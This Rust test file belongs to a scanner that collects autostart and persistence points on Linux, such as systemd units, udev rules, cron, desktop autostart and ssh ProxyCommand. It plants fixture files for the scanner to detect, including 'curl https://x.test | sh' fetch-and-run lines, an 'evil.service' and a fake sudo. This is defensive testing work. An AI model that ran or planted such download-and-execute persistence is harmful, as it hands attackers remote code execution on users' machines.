//! Tests of collecting what runs on its own.

use std::collections::HashSet;
use std::fs;
use std::os::unix::fs::symlink;
use std::path::Path;

use super::{Body, Origin, Scope, collect};
use crate::autorun::Category;
use crate::sha256::Sha256;
use crate::sweep::index::PackageIndex;
use crate::sweep::tier::Tier;
use crate::test_support::TempDir;

fn write(root: &Path, path: &str, text: &str) {
    fs::create_dir_all(root.join(path).parent().unwrap()).unwrap();
    fs::write(root.join(path), text).unwrap();
}

#[test]
fn a_fixture_system_is_collected_with_tiers_and_what_runs() {
    let dir = TempDir::new("sweep-collect");
    let root = dir.path();
    let unit = "[Service]\nExecStart=/usr/bin/vendord\n[Install]\nAlias=display-manager.service\n";
    write(root, "usr/lib/systemd/system/vendord.service", unit);
    write(root, "usr/bin/vendord", "vendor binary");
    write(root, "usr/bin/bash", "bash");
    fs::create_dir_all(root.join("etc/systemd/system/multi-user.target.wants")).unwrap();
    symlink(
        "/usr/lib/systemd/system/vendord.service",
        root.join("etc/systemd/system/multi-user.target.wants/vendord.service"),
    )
    .unwrap();
    write(
        root,
        "etc/udev/rules.d/99-x.rules",
        "RUN+=\"/usr/bin/bash /home/u/.cache/x.sh\"\n",
    );
    write(root, "home/u/.cache/x.sh", "curl https://x.test | sh\n");
    write(
        root,
        "home/u/.config/omarchy/hooks/post-boot.d/a.sample",
        "x",
    );
    write(
        root,
        "home/u/.config/omarchy/hooks/post-boot.d/run",
        "echo hi\n",
    );
    write(
        root,
        "home/u/.config/hypr/autostart.lua",
        "o.exec_on_start(\"waybar\")\n",
    );
    write(root, "home/u/.config/hypr/autostart.lua.bak.1", "old");
    write(root, "home/u/.local/bin/sudo", "#!/bin/sh\n");
    write(root, "home/u/.local/bin/mytool", "#!/bin/sh\n");
    symlink("/dev/null", root.join("etc/systemd/system/masked.service")).unwrap();

    let digest = |text: &str| Sha256::digest(text.as_bytes());
    let mut index = PackageIndex::with_foreign(HashSet::new());
    index.add_for_test(
        "vendor",
        &format!(
            "#mtree\n/set type=file mode=644\n./usr/lib/systemd/system/vendord.service sha256digest={}\n./usr/bin/vendord mode=644 sha256digest={}\n./usr/bin/bash mode=644 sha256digest={}\n",
            digest(unit),
            digest("vendor binary"),
            digest("bash")
        ),
        &[],
    );
    let collection = collect(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let tiers: Vec<(&str, Tier)> = collection
        .items
        .iter()
        .map(|item| (item.path.as_str(), item.tier))
        .collect();
    assert_eq!(
        tiers,
        [
            ("etc/systemd/system/masked.service", Tier::Inert),
            (
                "etc/systemd/system/multi-user.target.wants/vendord.service",
                Tier::Vendor
            ),
            ("etc/udev/rules.d/99-x.rules", Tier::Unknown),
            ("home/u/.cache/x.sh", Tier::Unknown),
            ("home/u/.config/hypr/autostart.lua", Tier::Unknown),
            (
                "home/u/.config/omarchy/hooks/post-boot.d/run",
                Tier::Unknown
            ),
            ("home/u/.local/bin/sudo", Tier::Unknown),
            ("usr/bin/bash", Tier::Vendor),
            ("usr/bin/vendord", Tier::Vendor),
            ("usr/lib/systemd/system/vendord.service", Tier::Vendor),
        ]
    );
    let script = &collection.items[3];
    assert_eq!(
        script.run_by.as_deref(),
        Some("etc/udev/rules.d/99-x.rules")
    );
    assert_eq!(script.origin, Origin::User);
    assert_eq!(script.category, Category::Udev);
    assert!(matches!(&script.body, Body::Text(text) if text.contains("curl")));
    assert_eq!(collection.items[4].runs, ["waybar"]);
}

#[test]
fn a_script_no_package_vouches_for_is_looked_through_for_what_it_starts() {
    let dir = TempDir::new("sweep-scripts");
    let root = dir.path();
    write(
        root,
        "etc/systemd/system/x.service",
        "[Service]\nExecStart=/home/u/bin/wrapper.sh\nExecStartPre=/usr/bin/packaged.sh\nExecStartPost=/home/u/bin/tool.py\n",
    );
    write(
        root,
        "home/u/bin/wrapper.sh",
        "#!/usr/bin/env bash\n. /home/u/lib/env.sh\n/home/u/.cache/stage2 --daemon &\n/home/u/bin/s2\n",
    );
    write(root, "home/u/lib/env.sh", "X=1\n");
    write(root, "home/u/.cache/stage2", "\u{7f}ELF");
    // A chain of scripts is followed three deep, and no further.
    for (name, next) in [("s2", "s3"), ("s3", "s4"), ("s4", "s5")] {
        write(
            root,
            &format!("home/u/bin/{name}"),
            &format!("#!/bin/sh\n/home/u/bin/{next}\n"),
        );
    }
    write(root, "home/u/bin/s5", "#!/bin/sh\ntrue\n");
    // A packaged script that is intact, and a script of another
    // interpreter, are not looked through.
    let packaged = "#!/bin/sh\n/home/u/bin/from-packaged\n";
    write(root, "usr/bin/packaged.sh", packaged);
    write(root, "home/u/bin/from-packaged", "x\n");
    write(
        root,
        "home/u/bin/tool.py",
        "#!/usr/bin/python3\n/home/u/bin/from-python\n",
    );
    write(root, "home/u/bin/from-python", "x\n");
    // A hook the catalogue names itself is a script like any other.
    write(
        root,
        "home/u/.config/omarchy/hooks/theme-set",
        "#!/bin/bash\n/home/u/bin/from-hook\n",
    );
    write(root, "home/u/bin/from-hook", "x\n");
    let mut index = PackageIndex::with_foreign(HashSet::new());
    index.add_for_test(
        "vendor",
        &format!(
            "#mtree\n./usr/bin/packaged.sh type=file mode=644 sha256digest={}\n",
            Sha256::digest(packaged.as_bytes())
        ),
        &[],
    );
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let collection = collect(&scope);
    let found = |path: &str| collection.items.iter().find(|item| item.path == path);
    let wrapper = found("home/u/bin/wrapper.sh").unwrap();
    assert_eq!(
        wrapper.runs,
        [
            "/home/u/lib/env.sh",
            "/home/u/.cache/stage2",
            "/home/u/bin/s2"
        ]
    );
    for (reached, by) in [
        ("home/u/.cache/stage2", "home/u/bin/wrapper.sh"),
        ("home/u/lib/env.sh", "home/u/bin/wrapper.sh"),
        ("home/u/bin/s3", "home/u/bin/s2"),
        ("home/u/bin/s4", "home/u/bin/s3"),
        (
            "home/u/bin/from-hook",
            "home/u/.config/omarchy/hooks/theme-set",
        ),
    ] {
        let item = found(reached).unwrap_or_else(|| panic!("{reached} was not collected"));
        assert_eq!(item.run_by.as_deref(), Some(by), "{reached}");
    }
    // The fourth script of the chain is reviewed as text, says that
    // what it runs was not followed, and so cannot be allowed.
    let last = found("home/u/bin/s4").unwrap();
    assert!(last.runs.is_empty());
    assert!(super::is_capped(last), "{:?}", last.notes);
    assert!(found("home/u/bin/s5").is_none());
    assert_eq!(found("usr/bin/packaged.sh").unwrap().tier, Tier::Vendor);
    for unreached in ["home/u/bin/from-packaged", "home/u/bin/from-python"] {
        assert!(found(unreached).is_none(), "{unreached}");
    }
}

#[test]
fn a_first_line_that_reads_like_a_script_does_not_stop_a_file_being_read_as_what_it_is() {
    // `#` starts a comment in every one of these formats.
    for shebang in ["", "#!/bin/sh\n"] {
        let dir = TempDir::new("sweep-formats");
        let root = dir.path();
        let stage = |name: &str| format!("/home/u/.cache/stage-{name}");
        let with = |text: String| format!("{shebang}{text}");
        write(
            root,
            "etc/systemd/system/evil.service",
            &with(format!("[Service]\nExecStart={}\n", stage("unit"))),
        );
        write(
            root,
            "etc/udev/rules.d/99-x.rules",
            &with(format!("ACTION==\"add\", RUN+=\"{}\"\n", stage("udev"))),
        );
        write(
            root,
            "home/u/.config/autostart/evil.desktop",
            &with(format!("[Desktop Entry]\nExec={}\n", stage("desktop"))),
        );
        write(
            root,
            "home/u/.config/hypr/hyprland.conf",
            &with(format!("exec-once = {}\n", stage("hypr"))),
        );
        write(root, "home/u/.ssh/config", "Include ~/.ssh/extra\n");
        write(
            root,
            "home/u/.ssh/extra",
            &with(format!("Host x\n  ProxyCommand {}\n", stage("ssh"))),
        );
        // A table of jobs named like a script, and one that starts
        // like one.
        write(
            root,
            "etc/cron.d/job.sh",
            &format!("* * * * * root {}\n", stage("cron-ext")),
        );
        write(
            root,
            "etc/cron.d/job",
            &format!("#!/bin/sh\n* * * * * root {}\n", stage("cron")),
        );
        write(
            root,
            "var/spool/cron/u",
            &format!("#!/bin/sh\n@reboot {}\n", stage("crontab")),
        );
        let stages = [
            "unit", "udev", "desktop", "hypr", "ssh", "cron-ext", "cron", "crontab",
        ];
        for name in stages {
            write(root, stage(name).trim_start_matches('/'), "x\n");
        }
        write(root, "etc/passwd", "u:x:1000:1000::/home/u:/bin/bash\n");
        let index = PackageIndex::with_foreign(HashSet::new());
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin: Origin::System,
        };
        let collection = collect(&scope);
        for name in stages {
            let path = stage(name);
            assert!(
                collection
                    .items
                    .iter()
                    .any(|item| item.path == path.trim_start_matches('/')),
                "{path} is not listed (first line {shebang:?})"
            );
        }
    }
}

#[test]
fn a_long_way_to_a_script_does_not_stand_for_the_short_one() {
    let dir = TempDir::new("sweep-decoy");
    let root = dir.path();
    // Whichever unit is walked first: the decoy chain reaches `x.sh`
    // four scripts deep, the direct unit one deep.
    for (direct, chain) in [("a-direct", "z-chain"), ("z-direct", "a-chain")] {
        write(
            root,
            &format!("etc/systemd/system/{direct}.service"),
            "[Service]\nExecStart=/home/u/bin/x.sh\n",
        );
        write(
            root,
            &format!("etc/systemd/system/{chain}.service"),
            "[Service]\nExecStart=/home/u/bin/d1\n",
        );
    }
    for (name, next) in [("d1", "d2"), ("d2", "d3"), ("d3", "x.sh")] {
        write(
            root,
            &format!("home/u/bin/{name}"),
            &format!("#!/bin/sh\n/home/u/bin/{next}\n"),
        );
    }
    write(
        root,
        "home/u/bin/x.sh",
        "#!/bin/sh\n/home/u/.cache/stage2\n",
    );
    write(root, "home/u/.cache/stage2", "x\n");
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let collection = collect(&scope);
    let script: Vec<_> = collection
        .items
        .iter()
        .filter(|item| item.path == "home/u/bin/x.sh")
        .collect();
    assert_eq!(script.len(), 1);
    assert_eq!(script[0].runs, ["/home/u/.cache/stage2"]);
    assert!(!super::is_capped(script[0]), "{:?}", script[0].notes);
    assert!(
        collection
            .items
            .iter()
            .any(|item| item.path == "home/u/.cache/stage2")
    );
}

#[test]
fn a_file_a_shell_is_handed_is_a_shell_script_whatever_it_is_called() {
    let dir = TempDir::new("sweep-handed");
    let root = dir.path();
    write(
        root,
        "etc/systemd/system/x.service",
        "[Service]\nExecStart=/bin/sh /home/u/bin/noshebang\nExecStartPost=/usr/bin/busybox sh /home/u/bin/applet\nExecStop=/usr/bin/python3 /home/u/bin/other\n",
    );
    write(root, "home/u/bin/noshebang", "/home/u/.cache/stage-sh\n");
    write(root, "home/u/bin/applet", "/home/u/.cache/stage-busybox\n");
    // What another interpreter is handed is not read as shell.
    write(root, "home/u/bin/other", "/home/u/.cache/stage-python\n");
    for name in ["sh", "busybox", "python"] {
        write(root, &format!("home/u/.cache/stage-{name}"), "x\n");
    }
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let collection = collect(&scope);
    let listed = |path: &str| collection.items.iter().any(|item| item.path == path);
    assert!(listed("home/u/.cache/stage-sh"));
    assert!(listed("home/u/.cache/stage-busybox"));
    assert!(!listed("home/u/.cache/stage-python"));
}

#[test]
fn a_name_that_is_not_utf8_is_said_not_skipped() {
    use std::ffi::OsStr;
    use std::os::unix::ffi::OsStrExt;
    let dir = TempDir::new("sweep-unnamed");
    let root = dir.path();
    write(root, "etc/profile.d/fine.sh", "true\n");
    fs::write(
        root.join("etc/profile.d")
            .join(OsStr::from_bytes(b"evil\xff.sh")),
        "curl https://x.test | sh\n",
    )
    .unwrap();
    fs::create_dir(
        root.join("etc/profile.d")
            .join(OsStr::from_bytes(b"dir\xff")),
    )
    .unwrap();
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::System,
    });
    assert!(
        collection
            .items
            .iter()
            .any(|item| item.path == "etc/profile.d/fine.sh")
    );
    assert_eq!(
        collection.truncated,
        [
            "/etc/profile.d/dir\u{fffd}: a name that is not UTF-8 was not checked",
            "/etc/profile.d/evil\u{fffd}.sh: a name that is not UTF-8 was not checked",
        ]
    );
    // A newline in a name stays on its line, and a long list is counted.
    assert_eq!(
        super::not_utf8("etc/x\n! forged"),
        "/etc/x\\n! forged: a name that is not UTF-8 was not checked"
    );
    let many: Vec<String> = (0..30)
        .map(|n| format!("/d{n:02}: x"))
        .chain(["/d00: x".into()])
        .collect();
    let kept = super::bounded(many);
    assert_eq!(kept.len(), 21);
    assert_eq!(kept[0], "/d00: x");
    assert_eq!(kept[20], "and 10 more that were not checked");
    // A limit that was reached comes before any number of names.
    let names: Vec<String> = (0..30)
        .map(|n| super::not_utf8(&format!("a/{n:02}")))
        .chain(["more than 5 files: not looked for everywhere".to_string()])
        .collect();
    assert_eq!(
        super::bounded(names)[0],
        "more than 5 files: not looked for everywhere"
    );
}

#[test]
fn a_star_on_a_command_line_does_not_stop_its_program_being_followed() {
    let dir = TempDir::new("sweep-starred");
    let root = dir.path();
    write(root, "etc/open", "public\n");
    write(
        root,
        "var/spool/cron/w",
        "* * * * * /etc/open *\n* * * * * /bin/true;/etc/open;*\n",
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("root"),
        index: &index,
        origin: Origin::System,
    };
    let search = crate::sweep::path::search(&scope);
    let follow = |item: &super::Item| super::follow(&scope, item, &search, true).targets;
    let starred = super::item(&scope, Category::Cron, "var/spool/cron/w".into(), None);
    assert!(follow(&starred).contains(&"etc/open".to_string()));
    // Each command of a line, however they are joined.
    write(root, "etc/second", "x\n");
    write(root, "etc/third", "x\n");
    write(
        root,
        "var/spool/cron/x",
        "* * * * * /bin/true;/etc/second && /etc/third | cat\n",
    );
    let joined = super::item(&scope, Category::Cron, "var/spool/cron/x".into(), None);
    let followed = follow(&joined);
    for path in ["etc/second", "etc/third"] {
        assert!(followed.contains(&path.to_string()), "{followed:?}");
    }
    // A line with more commands than are looked up says so, and so
    // does a file with a line too long to look through.
    let many = format!(
        "* * * * * {}/etc/second\n",
        "true;".repeat(crate::sweep::commands::MAX_INNER_COMMANDS)
    );
    write(root, "var/spool/cron/y", &many);
    let long = super::item(&scope, Category::Cron, "var/spool/cron/y".into(), None);
    let followed = super::follow(&scope, &long, &search, true);
    assert!(!followed.targets.contains(&"etc/second".to_string()));
    assert_eq!(
        followed.unfollowed,
        ["only the first 1024 commands of a line"]
    );
    write(
        root,
        "home/u/.bashrc",
        &format!("true {}\n~/bin/agent &\n", "x".repeat(70 * 1024)),
    );
    let shell = super::item(&scope, Category::Shell, "home/u/.bashrc".into(), None);
    assert!(super::is_capped(&shell), "{:?}", shell.notes);
    assert_eq!(shell.runs, ["~/bin/agent"]);
    assert!(!super::is_capped(&joined));
}

#[test]
fn a_pattern_names_files_and_a_case_branch_names_nothing() {
    let dir = TempDir::new("sweep-pattern");
    let root = dir.path();
    // What a pattern matches: a file, a link to one, a directory and a
    // link to a directory.
    write(root, "home/u/.config/hypr/conf.d/a.conf", "x\n");
    write(root, "home/u/.config/hypr/elsewhere.conf", "x\n");
    fs::create_dir_all(root.join("home/u/.config/hypr/conf.d/dir")).unwrap();
    symlink(
        "../elsewhere.conf",
        root.join("home/u/.config/hypr/conf.d/linked"),
    )
    .unwrap();
    symlink("dir", root.join("home/u/.config/hypr/conf.d/to-dir")).unwrap();
    write(
        root,
        "home/u/.config/hypr/hyprland.conf",
        "source = ~/.config/hypr/conf.d/*\n",
    );
    // The shape of a packaged completion file: the branch `/*)` is a
    // pattern, not a command over every top-level directory.
    for top in ["bin", "etc/x", "tmp/x"] {
        write(root, &format!("{top}/keep"), "x\n");
    }
    write(root, "usr/local/bin/tool", "x\n");
    write(
        root,
        "home/u/.bashrc",
        "case \"$cur\" in\n'')\n\tCOMPREPLY=()\n\t;;\n/*)\n\t/usr/local/bin/tool\n\t;;\nesac\n",
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    for origin in [Origin::System, Origin::Root] {
        let scope = Scope {
            root,
            home: Some("home/u"),
            index: &index,
            origin,
        };
        let search = crate::sweep::path::search(&scope);
        let conf = "home/u/.config/hypr/hyprland.conf";
        let sourced = super::item(&scope, Category::Hyprland, conf.into(), None);
        let mut targets = super::follow(&scope, &sourced, &search, true).targets;
        targets.sort();
        assert_eq!(
            targets,
            [
                "home/u/.config/hypr/conf.d/a.conf",
                "home/u/.config/hypr/conf.d/linked"
            ],
            "{origin:?}"
        );
        let shell = super::item(&scope, Category::Shell, "home/u/.bashrc".into(), None);
        assert_eq!(shell.runs, ["/usr/local/bin/tool"]);
        assert_eq!(
            super::follow(&scope, &shell, &search, true).targets,
            ["usr/local/bin/tool"]
        );
    }
}

#[test]
fn root_only_looks_where_a_user_points_if_the_user_could_too() {
    use std::os::unix::fs::PermissionsExt;
    let dir = TempDir::new("sweep-steered");
    let root = dir.path();
    // What a crontab in the spool names is a user's choice, whoever
    // the file belongs to: run as root (a container), these are root's.
    write(root, "var/spool/cron/u", "* * * * * /etc/secret\n");
    write(root, "var/spool/cron/v", "* * * * * /etc/open\n");
    write(root, "etc/secret", "pin 1234\n");
    write(root, "etc/open", "public\n");
    write(root, "root/private/key", "key\n");
    symlink("/etc/secret", root.join("etc/link")).unwrap();
    let mode = |path: &str, mode: u32| {
        fs::set_permissions(root.join(path), fs::Permissions::from_mode(mode)).unwrap();
    };
    mode("etc/secret", 0o600);
    mode("root/private", 0o700);
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = |origin| Scope {
        root,
        home: Some("root"),
        index: &index,
        origin,
    };
    let by = Some("var/spool/cron/u");
    let as_root = scope(Origin::Root);
    let follow_as = |scope: &Scope<'_>, item: &super::Item| {
        super::follow(scope, item, &crate::sweep::path::search(scope), true).targets
    };
    // What the crontab line leads to is not even looked for.
    let crontab = super::item(&as_root, Category::Cron, "var/spool/cron/u".into(), None);
    assert_eq!(crontab.runs, ["/etc/secret"]);
    assert!(follow_as(&as_root, &crontab).is_empty());
    let open_crontab = super::item(&as_root, Category::Cron, "var/spool/cron/v".into(), None);
    assert_eq!(follow_as(&as_root, &open_crontab), ["etc/open"]);
    // Nor where a user's link leads, directly or through a link only
    // root can see.
    let user_link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
    assert!(follow_as(&as_root, &user_link).is_empty());
    symlink("/etc/open", root.join("root/private/hop")).unwrap();
    symlink("/root/private/hop", root.join("etc/chain")).unwrap();
    let chain = super::item(&as_root, Category::Cron, "etc/chain".into(), by);
    assert_eq!(chain.body, Body::Link("/root/private/hop".into()));
    assert!(follow_as(&as_root, &chain).is_empty());
    assert_eq!(follow_as(&scope(Origin::System), &chain), ["etc/open"]);
    // The user's own sweep follows both.
    let as_user = scope(Origin::System);
    assert_eq!(follow_as(&as_user, &crontab), ["etc/secret"]);

    // Named by a user's crontab: what only root can read is not looked
    // at, and one that is not there looks the same.
    for path in ["etc/secret", "root/private/key", "etc/missing"] {
        let found = super::item(&as_root, Category::Cron, path.into(), by);
        assert_eq!(
            found.body,
            Body::Unreadable(super::NOT_LOOKED_AT.into()),
            "{path}"
        );
        assert_eq!(found.sha256, None, "{path}");
    }
    // The same for what a process names (a live check).
    let live = super::item(&as_root, Category::Process, "etc/secret".into(), None);
    assert_eq!(live.body, Body::Unreadable(super::NOT_LOOKED_AT.into()));
    // What everyone may read is hashed as before, and a link says
    // where it leads.
    let open = super::item(&as_root, Category::Cron, "etc/open".into(), by);
    assert_eq!(open.body, Body::Binary(super::WITHHELD));
    assert!(open.sha256.is_some());
    let link = super::item(&as_root, Category::Cron, "etc/link".into(), by);
    assert_eq!(link.body, Body::Link("/etc/secret".into()));
    // An auto-run location's own file, and the user's own sweep, are
    // not affected.
    let direct = super::item(&as_root, Category::Cron, "etc/secret".into(), None);
    assert!(matches!(direct.body, Body::Text(_)));
    let own = super::item(
        &scope(Origin::System),
        Category::Cron,
        "etc/secret".into(),
        by,
    );
    assert!(matches!(own.body, Body::Text(_)));

    assert!(super::is_there(&as_root, "etc/open", by));
    assert!(!super::is_there(&as_root, "etc/secret", by));
    // A directory a command names is not a program it runs.
    fs::create_dir_all(root.join("etc/named.d")).unwrap();
    assert!(!super::is_there(&as_root, "etc/named.d", by));
    assert!(!super::is_there(
        &scope(Origin::System),
        "etc/named.d",
        None
    ));
    // A link is not the file it leads to, in the guarded view.
    symlink("open", root.join("etc/beside")).unwrap();
    assert!(!super::is_file_there(&as_root, "etc/beside", None));
    assert!(super::is_file_there(
        &scope(Origin::System),
        "etc/beside",
        None
    ));
    assert!(super::is_file_there(&as_root, "etc/open", None));
    // A command through a link on the way: followed where nobody else
    // could have put the link, and told by the path really taken.
    symlink("etc", root.join("conf")).unwrap();
    fs::create_dir_all(root.join("tmp")).unwrap();
    symlink("../etc", root.join("tmp/conf")).unwrap();
    mode("tmp", 0o777);
    write(
        root,
        "var/spool/cron/w",
        "* * * * * /conf/open\n* * * * * /tmp/conf/open\n",
    );
    let through = super::item(&as_root, Category::Cron, "var/spool/cron/w".into(), None);
    assert_eq!(follow_as(&as_root, &through), ["etc/open"]);
    assert!(!super::is_there(&as_root, "tmp/conf/open", by));
    assert!(super::user_steered(root, None));
    // A crontab in the spool: its user decides what it names.
    assert!(super::user_steered(root, by));
}

#[test]
fn a_link_takes_its_units_trust_only_under_a_name_the_unit_declares() {
    let dir = TempDir::new("sweep-alias");
    let root = dir.path();
    let unit = "[Service]\nExecStart=/usr/bin/true\n[Install]\nAlias=display-manager.service\n";
    write(root, "usr/lib/systemd/system/sddm.service", unit);
    fs::create_dir_all(root.join("etc/systemd/system")).unwrap();
    for name in ["display-manager.service", "getty.service"] {
        symlink(
            "/usr/lib/systemd/system/sddm.service",
            root.join("etc/systemd/system").join(name),
        )
        .unwrap();
    }
    let mut index = PackageIndex::with_foreign(HashSet::new());
    index.add_for_test(
        "sddm",
        &format!(
            "#mtree\n./usr/lib/systemd/system/sddm.service type=file mode=644 sha256digest={}\n",
            Sha256::digest(unit.as_bytes())
        ),
        &[],
    );
    let collection = collect(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::System,
    });
    let tier = |path: &str| {
        collection
            .items
            .iter()
            .find(|item| item.path == path)
            .map(|item| item.tier)
    };
    assert_eq!(
        tier("etc/systemd/system/display-manager.service"),
        Some(Tier::Vendor)
    );
    assert_eq!(
        tier("etc/systemd/system/getty.service"),
        Some(Tier::Unknown)
    );
}

#[test]
fn devices_and_kernel_files_are_not_followed_and_a_plain_locale_file_is_quiet() {
    let dir = TempDir::new("sweep-not-followed");
    let root = dir.path();
    // What a command writes to is no program it runs.
    write(
        root,
        "etc/profile.d/tidy.sh",
        "strip --list-file /dev/stdout \"$1\"\ncat /proc/version /sys/x </run/sock >/dev/null\n/dev/shm/payload\n/run/user/1000/payload\n. /etc/locale.conf\n",
    );
    for path in [
        "dev/stdout",
        "dev/shm/payload",
        "proc/version",
        "sys/x",
        "run/user/1000/payload",
    ] {
        write(root, path, "x\n");
    }
    std::os::unix::net::UnixListener::bind(root.join("run/sock")).unwrap();
    write(
        root,
        "etc/locale.conf",
        "# the locale\nLANG=en_US.UTF-8\nLC_TIME=\"de_DE.UTF-8\"\n",
    );
    write(
        root,
        "home/u/.config/mimeapps.list",
        "[Default Applications]\n",
    );
    write(
        root,
        "usr/share/applications/mimeapps.list",
        "[Default Applications]\n",
    );
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    let collection = collect(&scope);
    let find = |path: &str| collection.items.iter().find(|item| item.path == path);
    for path in ["dev/stdout", "proc/version", "sys/x", "run/sock"] {
        assert!(find(path).is_none(), "{path}");
    }
    // A program in memory a user fills, or in a runtime directory, is
    // a program all the same.
    for path in ["dev/shm/payload", "run/user/1000/payload"] {
        assert!(find(path).is_some(), "{path}");
    }
    // The locale file is listed, and not as something to look at.
    let locale = find("etc/locale.conf").unwrap();
    assert_eq!(locale.tier, Tier::Inert);
    assert!(locale.is_trusted());
    // The list of handlers replaces no launcher.
    let handlers = find("home/u/.config/mimeapps.list").unwrap();
    assert!(handlers.notes.is_empty(), "{:?}", handlers.notes);
    // One that does more than name a language is an item like any.
    for text in [
        "LANG=en_US.UTF-8\nPATH=/tmp/x:$PATH\n",
        "LANG=$(curl x)\n",
        "LANG=C; /tmp/x\n",
    ] {
        write(root, "etc/locale.conf", text);
        let collection = collect(&scope);
        let locale = collection
            .items
            .iter()
            .find(|item| item.path == "etc/locale.conf")
            .unwrap();
        assert_eq!(locale.tier, Tier::Unknown, "{text}");
    }
}

#[test]
fn a_user_crontab_runs_from_that_users_home() {
    let dir = TempDir::new("sweep-crontab");
    let root = dir.path();
    write(
        root,
        "etc/passwd",
        "root:x:0:0::/root:/bin/bash\nu:x:1000:1000::/home/u:/bin/bash\n",
    );
    write(root, "var/spool/cron/u", "@reboot ~/x.sh\n");
    write(root, "home/u/x.sh", "curl x | sh\n");
    write(root, "root/x.sh", "root's\n");
    // A queued `at` job, in whichever spool: told by its hash, with
    // the environment it carries left where it is.
    for spool in ["var/spool/atd", "var/spool/at", "var/spool/cron/atjobs"] {
        write(
            root,
            &format!("{spool}/a0000101"),
            "#!/bin/sh\nTOKEN=hunter2; export TOKEN\n/home/u/x.sh\n",
        );
    }
    let index = PackageIndex::with_foreign(HashSet::new());
    let collection = collect(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::System,
    });
    assert!(
        collection
            .items
            .iter()
            .any(|item| item.path == "home/u/x.sh")
    );
    assert!(!collection.items.iter().any(|item| item.path == "root/x.sh"));
    let jobs: Vec<_> = collection
        .items
        .iter()
        .filter(|item| super::is_at_job(&item.path))
        .collect();
    assert_eq!(jobs.len(), 3);
    for job in jobs {
        assert_eq!(job.body, Body::Binary(super::WITHHELD), "{}", job.path);
        assert!(job.runs.is_empty() && job.sha256.is_some(), "{}", job.path);
    }
}
